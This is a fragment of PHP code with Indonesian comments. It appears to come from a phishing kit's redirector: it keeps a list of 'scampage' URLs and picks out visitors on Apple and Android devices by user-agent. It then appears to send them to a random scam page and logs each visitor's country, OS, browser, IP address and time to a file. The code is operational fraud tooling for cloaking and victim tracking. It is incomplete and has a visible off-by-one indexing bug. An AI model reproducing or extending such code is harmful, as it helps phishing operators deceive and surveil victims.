...
$scampage = array(
    "https://google.com",
    // Tambahin aja sebanyak banyaknya...
);

$lempar = "https://apple.com";
...
if(strstr($_SERVER['HTTP_USER_AGENT'],'iPod') || strstr($_SERVER['HTTP_USER_AGENT'],'iPhone') || strstr($_SERVER['HTTP_USER_AGENT'],'iPad') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS 9') || strstr($_SERVER['HTTP_USER_AGENT'],'Mac OS X') || strstr($_SERVER['HTTP_USER_AGENT'],'Android'))
{
    $jml = count($scampage);
    $ke = rand(0, $jml);
    $fh = fopen('xlogs.txt', 'a+');
    fwrite($fh, 'Accepted | page: '.$trgt.' | User-Agent:'." [ $nama_negara - $user_os - $user_browser - $ip - $dateTime ] $from\n");
    fclose($fh);
